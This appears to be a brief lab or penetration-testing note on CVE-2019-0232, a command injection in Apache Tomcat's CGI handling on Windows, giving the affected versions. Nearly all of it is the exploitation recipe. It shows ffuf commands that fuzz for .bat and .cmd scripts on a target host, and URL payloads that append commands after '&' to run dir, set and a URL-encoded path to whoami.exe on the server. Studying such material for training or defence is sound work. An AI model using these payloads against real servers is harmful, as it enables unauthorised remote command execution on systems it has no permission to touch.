
## CVE-2019-0232 

Versions affected: `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93`.

If the attacker controls the input to a CGI script that uses this command, they can inject their own commands after `&` to execute any command on the server.

---

## Exploitation

### FUFF

```shell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
### Fuzzing for .cmd scripts

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
### Fuzzing for .bat scripts
```

### HTTP

```http
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

If it doesnt work PATH has probably benn unset so lets check with `set`
```http
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

If this is the case write the full path like that (URL Encoded):
```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

---